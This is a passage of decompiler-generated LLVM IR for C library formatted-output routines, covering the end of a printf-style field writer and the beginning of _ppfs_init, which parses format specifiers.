  br i1 %v2_14378, label %dec_label_pc_143a4, label %dec_label_pc_14380

dec_label_pc_14380:                               ; preds = %dec_label_pc_14374, %dec_label_pc_14408
  %v0_14384 = phi i32 [ %v2_14374, %dec_label_pc_14374 ], [ %v4_14420, %dec_label_pc_14408 ]
  %v3_14380 = load i32, i32* %stack_var_-348, align 4
  store i32 %v0_14384, i32* %r0.global-to-local, align 4
  %v4_14388 = ashr i32 %v3_14380, 31
  %v5_14388 = or i32 %v4_14388, %v3_14380
  %v2_1438c = inttoptr i32 %v0_14384 to i8*
  %v3_1438c = call i32 @strnlen(i8* %v2_1438c, i32 %v5_14388)
  store i32 %v3_1438c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 %v3_1438c, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_144a8

dec_label_pc_143a4:                               ; preds = %dec_label_pc_14374, %dec_label_pc_142f4
  %v3_143a4 = load i32, i32* %stack_var_-348, align 4
  %v1_143a8 = icmp slt i32 %v3_143a4, 0
  br i1 %v1_143a8, label %dec_label_pc_143c0, label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %dec_label_pc_143a4
  %tmp212 = icmp ult i32 %v3_143a4, 6
  br i1 %tmp212, label %dec_label_pc_143c8, label %dec_label_pc_143c0

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143b0, %dec_label_pc_143a4
  br label %dec_label_pc_143c8

dec_label_pc_143c8:                               ; preds = %dec_label_pc_143b0, %dec_label_pc_143c0
  %storemerge97 = phi i32 [ 6, %dec_label_pc_143c0 ], [ 0, %dec_label_pc_143b0 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37064), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_144a8

dec_label_pc_143d8:                               ; preds = %dec_label_pc_1436c
  store i32 %v2_14374, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_14418, i32* @r4, align 4
  store i32 %v2_14374, i32* %stack_var_-200, align 4
  br label %dec_label_pc_144a8thread-pre-split

dec_label_pc_14400:                               ; preds = %dec_label_pc_14364
  br i1 %v7_14400, label %dec_label_pc_14408, label %dec_label_pc_1442c

dec_label_pc_14408:                               ; preds = %dec_label_pc_14400
  %v0_1440c = call i32 @__aeabi_read_tp()
  store i32 %v0_1440c, i32* %r0.global-to-local, align 4
  %v3_14410 = load i16, i16* @global_var_222f0.75, align 2
  %v4_14410 = sext i16 %v3_14410 to i32
  %v2_14414 = add i32 %v4_14410, %v0_1440c
  %v3_14414 = inttoptr i32 %v2_14414 to i32*
  %v4_14414 = load i32, i32* %v3_14414, align 4
  store i32 %v4_14414, i32* @r0, align 4
  %v0_1441c = load i32, i32* %r2.global-to-local, align 4
  %v1_1441c = add i32 %v0_1441c, 108
  store i32 %v1_1441c, i32* @r2, align 4
  %v4_14420 = call i32 @__GI___glibc_strerror_r(i32 %v4_14414, i32 %v2_14418, i32 %v1_1441c, i32 %v4_14410)
  store i32 %v4_14420, i32* %r0.global-to-local, align 4
  store i32 %v4_14420, i32* @r4, align 4
  br label %dec_label_pc_14380

dec_label_pc_1442c:                               ; preds = %dec_label_pc_14400
  %v4_14434 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 704) to i32*), align 4
  %v1_1443c = add i32 %v4_14434, 10
  store i32 %v1_1443c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14440

dec_label_pc_14440:                               ; preds = %dec_label_pc_14488, %dec_label_pc_1442c
  %v1_14450 = phi i32 [ %v1_14488, %dec_label_pc_14488 ], [ %v4_14434, %dec_label_pc_1442c ]
  %v1_14440 = inttoptr i32 %v1_14450 to i8*
  %v2_14440 = load i8, i8* %v1_14440, align 1
  %v3_14440 = zext i8 %v2_14440 to i32
  store i32 %v3_14440, i32* %r2.global-to-local, align 4
  %v9_14448 = icmp eq i32 %v3_14440, %tmp99
  br i1 %v9_14448, label %dec_label_pc_14450, label %dec_label_pc_14488

dec_label_pc_14450:                               ; preds = %dec_label_pc_14440
  %v2_14450 = sub i32 %v1_14450, %v4_14434
  %v0_14454 = load i32, i32* @fp, align 4
  store i32 %v0_14454, i32* %r0.global-to-local, align 4
  store i32 %v2_1445c, i32* %r2.global-to-local, align 4
  %v4_14464 = mul i32 %v2_14450, 4
  %v5_14464 = add i32 %v4_14464, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13256)
  %v6_14464 = inttoptr i32 %v5_14464 to i32*
  %v7_14464 = load i32, i32* %v6_14464, align 4
  store i32 83056, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14464)
  %v0_14470 = load i32, i32* %r0.global-to-local, align 4
  %v1_14470 = icmp slt i32 %v0_14470, 0
  br i1 %v1_14470, label %dec_label_pc_14600, label %dec_label_pc_14478

dec_label_pc_14478:                               ; preds = %dec_label_pc_14450
  %v2_1447c = add i32 %v0_14470, %v1_144d8
  br label %dec_label_pc_145ec

dec_label_pc_14488:                               ; preds = %dec_label_pc_14440
  %v1_14488 = add i32 %v1_14450, 1
  %v3_1448c = icmp ult i32 %v1_14488, %v1_1443c
  br i1 %v3_1448c, label %dec_label_pc_14440, label %dec_label_pc_14600

dec_label_pc_14498:                               ; preds = %dec_label_pc_14304
  %v0_14498 = load i32, i32* @sl, align 4
  store i32 %v0_14498, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_14498, i32* @r4, align 4
  br label %dec_label_pc_144a8

dec_label_pc_144a8thread-pre-split:               ; preds = %.thread85, %dec_label_pc_14294, %dec_label_pc_1434c, %dec_label_pc_143d8
  %v1_144ac.pre = phi i32 [ %v1_144ac.pre205, %dec_label_pc_14294 ], [ %v1_144ac.pre.pre, %dec_label_pc_1434c ], [ 1, %dec_label_pc_143d8 ], [ %v2_14214, %.thread85 ]
  %v0_144ac.pre = phi i32 [ 0, %dec_label_pc_14294 ], [ %v0_144ac.pre.pre, %dec_label_pc_1434c ], [ 0, %dec_label_pc_143d8 ], [ %v2_14288, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_14208, %dec_label_pc_14294 ], [ %v0_14138, %dec_label_pc_1434c ], [ %v0_14138, %dec_label_pc_143d8 ], [ %v0_14208, %.thread85 ]
  %v0_144a8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_144a8thread-pre-split, %dec_label_pc_143c8, %dec_label_pc_14380, %dec_label_pc_14498
  %v1_144ac = phi i32 [ %v1_144ac.pre, %dec_label_pc_144a8thread-pre-split ], [ %storemerge97, %dec_label_pc_143c8 ], [ %v3_1438c, %dec_label_pc_14380 ], [ %v6_14318, %dec_label_pc_14498 ]
  %v0_144ac = phi i32 [ %v0_144ac.pre, %dec_label_pc_144a8thread-pre-split ], [ 0, %dec_label_pc_143c8 ], [ 0, %dec_label_pc_14380 ], [ %v0_14498, %dec_label_pc_14498 ]
  %v0_144b4 = phi i32 [ %v0_144a8.pr, %dec_label_pc_144a8thread-pre-split ], [ 11, %dec_label_pc_143c8 ], [ 11, %dec_label_pc_14380 ], [ 11, %dec_label_pc_14498 ]
  %v0_144f4 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_144a8thread-pre-split ], [ %v0_14138, %dec_label_pc_143c8 ], [ %v0_14138, %dec_label_pc_14380 ], [ %v0_14138, %dec_label_pc_14498 ]
  %v7_144a8 = icmp eq i32 %v0_144b4, 11
  %v2_144ac = add i32 %v1_144ac, %v0_144ac
  br i1 %v7_144a8, label %dec_label_pc_144c4, label %bb173

bb173:                                            ; preds = %dec_label_pc_144a8
  %v7_144bc = icmp sgt i32 %v0_144b4, 5
  %. = select i1 %v7_144bc, i32 2, i32 1
  %v2_144c0 = add i32 %v2_144ac, %.
  br label %dec_label_pc_144c4

dec_label_pc_144c4:                               ; preds = %dec_label_pc_144a8, %bb173
  %v0_144d8 = phi i32 [ %v2_144ac, %dec_label_pc_144a8 ], [ %v2_144c0, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_144c8 = icmp uge i32 %tmp98, %v0_144d8
  %v9_144c8 = icmp eq i32 %tmp98, %v0_144d8
  %v2_144cc = xor i1 %v9_144c8, true
  %v3_144cc = and i1 %v3_144c8, %v2_144cc
  br i1 %v3_144cc, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_144c4
  %v2_144c8 = sub i32 %tmp98, %v0_144d8
  store i32 %v2_144c8, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_144c4, %bb174
  store i32 %v1_144d8, i32* %r2.global-to-local, align 4
  %v2_144d4 = xor i1 %v3_144c8, true
  %v3_144d4 = or i1 %v9_144c8, %v2_144d4
  br i1 %v3_144d4, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_144dc.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_144ec = phi i32 [ %v1_144dc.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_144d8 = add i32 %v0_144d8, %v1_144d8
  %v2_144dc = add i32 %v2_144d8, %v2_144ec
  %v0_144e8 = load i32, i32* @sb, align 4
  %v7_144e8 = icmp eq i32 %v0_144e8, 48
  br i1 %v7_144e8, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_144ec = add i32 %v2_144ec, %v0_144ac
  store i32 %v3_144ec, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_14504 = phi i32 [ %v2_144ec, %bb177 ], [ 0, %bb178 ]
  %v1_144f4 = and i32 %v0_144f4, 8
  store i32 %v1_144f4, i32* @r7, align 4
  %v2_144f4 = icmp eq i32 %v1_144f4, 0
  br i1 %v2_144f4, label %dec_label_pc_144fc, label %dec_label_pc_14518

dec_label_pc_144fc:                               ; preds = %.thread30
  %v0_144fc = load i32, i32* @fp, align 4
  store i32 %v0_144fc, i32* %r0.global-to-local, align 4
  store i32 %v0_14504, i32* %r2.global-to-local, align 4
  %v4_14508 = call i32 @_charpad(i32 %v0_144fc, i8 32, i32 %v0_14504)
  store i32 %v4_14508, i32* %r0.global-to-local, align 4
  %v1_1450c = load i32, i32* @sl, align 4
  %v9_1450c = icmp eq i32 %v4_14508, %v1_1450c
  br i1 %v9_1450c, label %dec_label_pc_14514, label %dec_label_pc_14600

dec_label_pc_14514:                               ; preds = %dec_label_pc_144fc
  %v0_14514 = load i32, i32* @r7, align 4
  store i32 %v0_14514, i32* @sl, align 4
  %v0_14520.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14518

dec_label_pc_14518:                               ; preds = %.thread30, %dec_label_pc_14514
  %v0_14520 = phi i32 [ %v0_144b4, %.thread30 ], [ %v0_14520.pre, %dec_label_pc_14514 ]
  %v0_1451c = load i32, i32* @fp, align 4
  %v2_14520 = add i32 %v0_14520, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37056)
  store i32 %v2_14520, i32* %r0.global-to-local, align 4
  %v2_14524 = inttoptr i32 %v2_14520 to i8*
  %v3_14524 = call i32 @__GI_fputs_unlocked(i8* %v2_14524, i32 %v0_1451c)
  %v0_14528 = load i32, i32* @fp, align 4
  store i32 %v0_14528, i32* %r0.global-to-local, align 4
  %v0_14530 = load i32, i32* @r8, align 4
  store i32 %v0_14530, i32* %r2.global-to-local, align 4
  %v4_14534 = call i32 @_charpad(i32 %v0_14528, i8 48, i32 %v0_14530)
  store i32 %v4_14534, i32* %r0.global-to-local, align 4
  %v1_14538 = load i32, i32* @r8, align 4
  %v9_14538 = icmp eq i32 %v4_14534, %v1_14538
  br i1 %v9_14538, label %dec_label_pc_14540, label %dec_label_pc_14600

dec_label_pc_14540:                               ; preds = %dec_label_pc_14518
  %v3_14540 = load i32, i32* %stack_var_-44, align 4
  %v2_14544 = icmp eq i32 %v3_14540, 0
  br i1 %v2_14544, label %dec_label_pc_1454c, label %dec_label_pc_14570

dec_label_pc_1454c:                               ; preds = %dec_label_pc_14540
  %v0_1454c = load i32, i32* @r5, align 4
  %v2_1454c = icmp eq i32 %v0_1454c, 0
  br i1 %v2_1454c, label %dec_label_pc_145d4, label %dec_label_pc_14554

dec_label_pc_14554:                               ; preds = %dec_label_pc_1454c
  %v0_14554 = load i32, i32* @r4, align 4
  store i32 %v0_14554, i32* %r0.global-to-local, align 4
  %v0_1455c = load i32, i32* @fp, align 4
  store i32 %v0_1455c, i32* %r2.global-to-local, align 4
  %v3_14560 = inttoptr i32 %v0_1455c to i16*
  %v4_14560 = call i32 @__stdio_fwrite(i32 %v0_14554, i32 %v0_1454c, i16* %v3_14560)
  store i32 %v4_14560, i32* %r0.global-to-local, align 4
  %v1_14564 = load i32, i32* @r5, align 4
  %v9_14564 = icmp eq i32 %v4_14560, %v1_14564
  br i1 %v9_14564, label %dec_label_pc_145d4, label %dec_label_pc_14600

dec_label_pc_14570:                               ; preds = %dec_label_pc_14540
  store i32 %v2_14418, i32* @r6, align 4
  store i32 %v2_14308, i32* @r8, align 4
  store i32 %v2_14314, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_145c0.pr = load i32, i32* @r5, align 4
  %v2_145c041 = icmp eq i32 %v0_145c0.pr, 0
  store i32 %v2_14308, i32* @r1, align 4
  store i32 %v2_14418, i32* @r0, align 4
  br i1 %v2_145c041, label %dec_label_pc_145d4, label %dec_label_pc_14588

dec_label_pc_14588:                               ; preds = %dec_label_pc_14570, %dec_label_pc_145bc
  %v1_1458c = phi i32 [ %v2_145bc, %dec_label_pc_145bc ], [ %v0_145c0.pr, %dec_label_pc_14570 ]
  %v2_14588 = icmp ult i32 %v1_1458c, 128
  %.v1_1458c = select i1 %v2_14588, i32 %v1_1458c, i32 128
  store i32 %.v1_1458c, i32* %r2.global-to-local, align 4
  %v6_14594 = call i32 @__GI_wcsrtombs(i32 %v2_14418, i32 %v2_14308, i32 %.v1_1458c, i32 %v2_14314, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_14594, i32* @r4, align 4
  %v2_14598 = icmp eq i32 %v6_14594, 0
  store i32 %v6_14594, i32* %r0.global-to-local, align 4
  br i1 %v2_14598, label %dec_label_pc_145bc, label %dec_label_pc_145a4

dec_label_pc_145a4:                               ; preds = %dec_label_pc_14588
  store i32 %v2_14418, i32* %r0.global-to-local, align 4
  %v0_145ac = load i32, i32* @fp, align 4
  store i32 %v0_145ac, i32* %r2.global-to-local, align 4
  %v3_145b0 = inttoptr i32 %v0_145ac to i16*
  %v4_145b0 = call i32 @__stdio_fwrite(i32 %v2_14418, i32 %v6_14594, i16* %v3_145b0)
  store i32 %v4_145b0, i32* %r0.global-to-local, align 4
  %v1_145b4 = load i32, i32* @r4, align 4
  %v9_145b4 = icmp eq i32 %v4_145b0, %v1_145b4
  br i1 %v9_145b4, label %dec_label_pc_145bc, label %dec_label_pc_14600

dec_label_pc_145bc:                               ; preds = %dec_label_pc_145a4, %dec_label_pc_14588
  %v0_145bc = phi i32 [ %v4_145b0, %dec_label_pc_145a4 ], [ 0, %dec_label_pc_14588 ]
  %v1_145bc = load i32, i32* @r5, align 4
  %v2_145bc = sub i32 %v1_145bc, %v0_145bc
  store i32 %v2_145bc, i32* @r5, align 4
  %v2_145c0 = icmp eq i32 %v2_145bc, 0
  store i32 %v2_14308, i32* @r1, align 4
  store i32 %v2_14418, i32* @r0, align 4
  br i1 %v2_145c0, label %dec_label_pc_145d4, label %dec_label_pc_14588

dec_label_pc_145d4:                               ; preds = %dec_label_pc_145bc, %dec_label_pc_14570, %dec_label_pc_14554, %dec_label_pc_1454c
  %v0_145d4 = load i32, i32* @fp, align 4
  store i32 %v0_145d4, i32* %r0.global-to-local, align 4
  %v0_145dc = load i32, i32* @sl, align 4
  store i32 %v0_145dc, i32* %r2.global-to-local, align 4
  %v4_145e0 = call i32 @_charpad(i32 %v0_145d4, i8 32, i32 %v0_145dc)
  store i32 %v4_145e0, i32* %r0.global-to-local, align 4
  %v1_145e4 = load i32, i32* @sl, align 4
  %v9_145e4 = icmp eq i32 %v4_145e0, %v1_145e4
  br i1 %v9_145e4, label %dec_label_pc_145ec, label %dec_label_pc_14600

dec_label_pc_145ec:                               ; preds = %dec_label_pc_145d4, %dec_label_pc_14478, %dec_label_pc_142cc, %dec_label_pc_140dc
  %stack_var_-336.4 = phi i32 [ %v0_14138, %dec_label_pc_140dc ], [ %v0_144f4, %dec_label_pc_145d4 ], [ %v0_14138, %dec_label_pc_14478 ], [ %v0_14138, %dec_label_pc_142cc ]
  %stack_var_-356.3 = phi i32 [ %v1_144d8, %dec_label_pc_140dc ], [ %v2_144dc, %dec_label_pc_145d4 ], [ %v2_1447c, %dec_label_pc_14478 ], [ %v2_142d0, %dec_label_pc_142cc ]
  %v3_145ec = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_145ec, i32* @r4, align 4
  store i32 %v3_145ec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14004.outer

dec_label_pc_145f8:                               ; preds = %dec_label_pc_14060
  %v1_145f8 = add i32 %v0_14068, 2
  store i32 %v1_145f8, i32* @r4, align 4
  br label %dec_label_pc_14004.outer36

dec_label_pc_14600:                               ; preds = %dec_label_pc_14488, %dec_label_pc_14304, %dec_label_pc_145d4, %dec_label_pc_14554, %dec_label_pc_14518, %dec_label_pc_144fc, %dec_label_pc_14450, %dec_label_pc_1432c, %dec_label_pc_142a4, %bb142, %dec_label_pc_145a4
  br label %dec_label_pc_14608

dec_label_pc_14608:                               ; preds = %dec_label_pc_14054, %bb, %dec_label_pc_13f98, %dec_label_pc_14600
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_13f98 ], [ -1, %dec_label_pc_14600 ], [ %v1_144d8, %dec_label_pc_14054 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_13f48, i32* @r5, align 4
  store i32 %v9_13f48, i32* @r6, align 4
  store i32 %v12_13f48, i32* @r7, align 4
  store i32 %v15_13f48, i32* @r8, align 4
  store i32 %v18_13f48, i32* @sb, align 4
  store i32 %v21_13f48, i32* @sl, align 4
  store i32 %v24_13f48, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_145f8, { 1, 0 }
  uselistorder i32 %v3_145ec, { 1, 2, 0 }
  uselistorder i32 %v2_145bc, { 1, 2, 0 }
  uselistorder i32 %v0_14504, { 1, 0 }
  uselistorder i32 %v2_144ec, { 2, 0, 1 }
  uselistorder i1 %v9_144c8, { 1, 0 }
  uselistorder i32 %v2_144ac, { 1, 0 }
  uselistorder i32 %v0_144f4, { 1, 0 }
  uselistorder i32 %v0_144ac, { 1, 0 }
  uselistorder i32 %v1_14488, { 1, 0 }
  uselistorder i32 %v1_14450, { 1, 0, 2 }
  uselistorder i32 %v4_14420, { 1, 2, 0 }
  uselistorder i32 %v4_14410, { 1, 0 }
  uselistorder i32 %v0_14384, { 1, 0 }
  uselistorder i32 %v2_14374, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_1433c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_142b4, { 1, 0 }
  uselistorder i32 %v2_14214, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_14230, { 1, 2, 3, 0 }
  uselistorder i32 %v2_141b0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_14118, { 0, 2, 1, 3 }
  uselistorder i32 %v1_140bc.pre, { 1, 0, 2 }
  uselistorder i32 %v1_140b4, { 1, 0 }
  uselistorder i32 %v1_14060, { 0, 1, 3, 2 }
  uselistorder i32 %v1_144d8, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9 }
  uselistorder i32 %v2_14020, { 1, 0 }
  uselistorder i32 %v1_14018.lcssa, { 1, 0 }
  uselistorder i8 %v2_14004, { 1, 0 }
  uselistorder i32 %v2_14018, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_14030, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14138, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_14228, { 1, 0 }
  uselistorder i1 %v7_14178, { 1, 2, 0 }
  uselistorder i1 %v7_14364, { 1, 0 }
  uselistorder i1 %v7_142dc, { 1, 0 }
  uselistorder i1 %v7_141b8, { 1, 0 }
  uselistorder i32 %v2_14314, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_14308, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_14418, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_140b8, { 1, 3, 2, 0 }
  uselistorder i32 %v4_14094, { 1, 0 }
  uselistorder i32 %v2_13f50, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 18, 4, 5, 6, 7, 8, 9, 10, 21, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 22, 23, 29, 30, 24, 25, 26, 27, 28 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 9, 8, 10, 12, 11, 17, 13, 14, 15, 16, 18, 19, 22, 20, 21, 24, 23, 26, 25, 28, 27, 30, 29, 33, 31, 32, 36, 37, 34, 35, 38, 39, 1, 48, 41, 40, 43, 42, 45, 44, 47, 46, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -58316), { 1, 0 }
  uselistorder i8 10, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_14608, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14600, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_14588, { 1, 0 }
  uselistorder label %dec_label_pc_14518, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_144c4, { 1, 0 }
  uselistorder label %dec_label_pc_144a8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_144a8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_143c8, { 1, 0 }
  uselistorder label %dec_label_pc_14380, { 1, 0 }
  uselistorder label %dec_label_pc_14294, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_14168, { 1, 0 }
  uselistorder label %dec_label_pc_14164, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_140b0, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_14054, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_14020, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_14004.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_1463c = load i32, i32* @r4, align 4
  %v6_1463c = load i32, i32* @r5, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14648 = load i32, i32* @r1, align 4
  store i32 %v0_14648, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14654 = bitcast i32* %arg1 to i8*
  %v4_14654 = call i32 @__GI_memset(i8* %v3_14654, i32 0, i32 152)
  store i32 %v4_14654, i32* %r0.global-to-local, align 4
  %v0_14658 = load i32, i32* @r4, align 4
  %v1_14658 = add i32 %v0_14658, 24
  %v2_14658 = inttoptr i32 %v1_14658 to i32*
  %v3_14658 = load i32, i32* %v2_14658, align 4
  store i32 %v3_14658, i32* %r3.global-to-local, align 4
  %v0_1465c = load i32, i32* @r5, align 4
  %v2_1465c = inttoptr i32 %v0_14658 to i32*
  store i32 %v0_1465c, i32* %v2_1465c, align 4
  %v0_14660 = load i32, i32* %r3.global-to-local, align 4
  %v1_14660 = add i32 %v0_14660, -1
  %v1_14664 = load i32, i32* @r4, align 4
  %v2_14664 = add i32 %v1_14664, 24
  %v3_14664 = inttoptr i32 %v2_14664 to i32*
  store i32 %v1_14660, i32* %v3_14664, align 4
  %v0_14668 = load i32, i32* @r4, align 4
  %v1_14668 = add i32 %v0_14668, 40
  store i32 %v1_14668, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_1467821 = inttoptr i32 %v1_14668 to i32*
  store i32 8, i32* %v2_1467821, align 4
  %v3_1467822 = load i32, i32* %r2.global-to-local, align 4
  %v4_1467823 = add i32 %v3_1467822, 4
  store i32 %v4_1467823, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14674.dec_label_pc_14674_crit_edge

dec_label_pc_14674.dec_label_pc_14674_crit_edge:  ; preds = %entry, %dec_label_pc_14674.dec_label_pc_14674_crit_edge
  %v4_1467824 = phi i32 [ %v4_1467823, %entry ], [ %v4_14678, %dec_label_pc_14674.dec_label_pc_14674_crit_edge ]
  %v0_14674.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14678.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14674 = add i32 %v0_14674.pre, -1
  store i32 %v1_14674, i32* %r3.global-to-local, align 4
  %v7_14674 = icmp eq i32 %v0_14674.pre, 1
  %v2_14678 = inttoptr i32 %v4_1467824 to i32*
  store i32 %v0_14678.pre, i32* %v2_14678, align 4
  %v3_14678 = load i32, i32* %r2.global-to-local, align 4
  %v4_14678 = add i32 %v3_14678, 4
  store i32 %v4_14678, i32* %r2.global-to-local, align 4
  br i1 %v7_14674, label %dec_label_pc_14680, label %dec_label_pc_14674.dec_label_pc_14674_crit_edge

dec_label_pc_14680:                               ; preds = %dec_label_pc_14674.dec_label_pc_14674_crit_edge
  %v0_14680 = load i32, i32* @r5, align 4
  store i32 %v0_14680, i32* %r2.global-to-local, align 4
  %v1_146c02 = inttoptr i32 %v0_14680 to i8*
  %v2_146c03 = load i8, i8* %v1_146c02, align 1
  %v3_146c04 = zext i8 %v2_146c03 to i32
  store i32 %v3_146c04, i32* %r0.global-to-local, align 4
  %v2_146c45 = icmp eq i8 %v2_146c03, 0
  br i1 %v2_146c45, label %dec_label_pc_146cc, label %dec_label_pc_14688

dec_label_pc_14688:                               ; preds = %dec_label_pc_14680, %dec_label_pc_146c0.backedge
  %v0_14690 = phi i32 [ %storemerge, %dec_label_pc_146c0.backedge ], [ %v0_14680, %dec_label_pc_14680 ]
  %v0_14688 = phi i32 [ %v3_146c0, %dec_label_pc_146c0.backedge ], [ %v3_146c04, %dec_label_pc_14680 ]
  %v7_14688 = icmp eq i32 %v0_14688, 37
  br i1 %v7_14688, label %dec_label_pc_14690, label %dec_label_pc_146bc

dec_label_pc_14690:                               ; preds = %dec_label_pc_14688
  %v1_14690 = add i32 %v0_14690, 1
  %v2_14690 = inttoptr i32 %v1_14690 to i8*
  %v3_14690 = load i8, i8* %v2_14690, align 1
  %v4_14690 = zext i8 %v3_14690 to i32
  store i32 %v4_14690, i32* %r3.global-to-local, align 4
  store i32 %v1_14690, i32* %r2.global-to-local, align 4
  %v7_14694 = icmp eq i8 %v3_14690, 37
  br i1 %v7_14694, label %dec_label_pc_146bc, label %dec_label_pc_1469c

dec_label_pc_1469c:                               ; preds = %dec_label_pc_14690
  %v1_1469c = load i32, i32* @r4, align 4
  %v2_1469c = inttoptr i32 %v1_1469c to i32*
  store i32 %v1_14690, i32* %v2_1469c, align 4
  %v0_146a0 = load i32, i32* @r4, align 4
  store i32 %v0_146a0, i32* %r0.global-to-local, align 4
  %v1_146a4 = inttoptr i32 %v0_146a0 to i8*
  %v2_146a4 = call i32 @_ppfs_parsespec(i8* %v1_146a4)
  store i32 %v2_146a4, i32* %r0.global-to-local, align 4
